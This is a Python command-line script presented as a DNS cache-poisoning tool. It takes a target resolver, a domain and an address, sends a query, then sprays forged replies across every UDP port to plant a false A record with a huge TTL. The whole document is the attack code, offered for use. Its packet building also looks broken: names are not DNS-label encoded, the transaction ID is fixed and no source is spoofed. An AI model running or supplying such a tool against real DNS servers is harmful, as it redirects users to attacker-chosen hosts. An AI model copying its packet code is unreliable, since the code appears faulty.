#!/usr/bin/env python3
"""A DNS-server cache poisoning tool."""
import sys
import re

from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack
from argparse import ArgumentParser
from logging import error


DNS_PORT = 53


def main():
    """
    Request to server sending and trying
    to send a fake data to this server.
    """
    server, name, address = argument_parse()
    transaction_id = 1
    request = get_request(name, transaction_id)
    reply = get_reply(name, address, transaction_id)
    sock = socket(AF_INET, SOCK_DGRAM)

    with sock:

        # Request sending.
        sock.sendto(request, (server, DNS_PORT))

        # DNS-server starts to ask its forward server.

        # Trying to imitate a forwarder.
        for port in range(65536):
            try:
                sock.sendto(reply, (server, port))
            except OSError:
                continue


def argument_parse():
    """Arguments parsing."""
    parser = ArgumentParser(prog="python3 poison.py", \
        description="The program for DNS-server cahce poisoning.", \
        epilog="(c) Semyon Makhaev, 2016. All rights reserved.")
    parser.add_argument("server", type=str, help="IP-address of the target DNS-server.")
    parser.add_argument("name", type=str, help="The requested domain name.")
    parser.add_argument("address", type=str, help="The address for this domain name.")
    args = parser.parse_args()

    address_pattern = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")
    if re.search(address_pattern, args.server) is None or \
                re.search(address_pattern, args.address) is None:
        error("Incorrect address.")
        sys.exit(0)

    return args.server, args.name, args.address


def get_request(name, transaction_id):
    """A request to DNS-server assembling."""
    zero = 0# Using for flags, answer RRs, authority RRs, additional RRs.
    questions = 1
    request_type = 1
    request_class = 1
    request = pack("!HHHHHH{}sBHH".format(len(name)), transaction_id, zero, \
        questions, zero, zero, zero, name.encode(), zero, request_type, request_class)
    return request


def get_reply(name, address, transaction_id):
    """A forwarder reply to DNS-server assembling."""
    questions = 1
    answer_rrs = 1
    zero = 0
    reply_type = 1
    reply_class = 1
    data_len = 4
    # TTL: 255 ** 4 = 4228250625. It's a random value.
    addr = [int(part) for part in address.split('.')]
    reply = pack("!HHHHL{}sBHHHHHLHBBBB".format(len(name)), transaction_id, 1 << 3, \
        questions, answer_rrs, zero, name.encode(), zero, reply_type, reply_class, \
        zero, reply_type, reply_class, 4228250625, data_len, addr[0], addr[1], \
        addr[2], addr[3])
    return reply


if __name__ == '__main__':
    main()
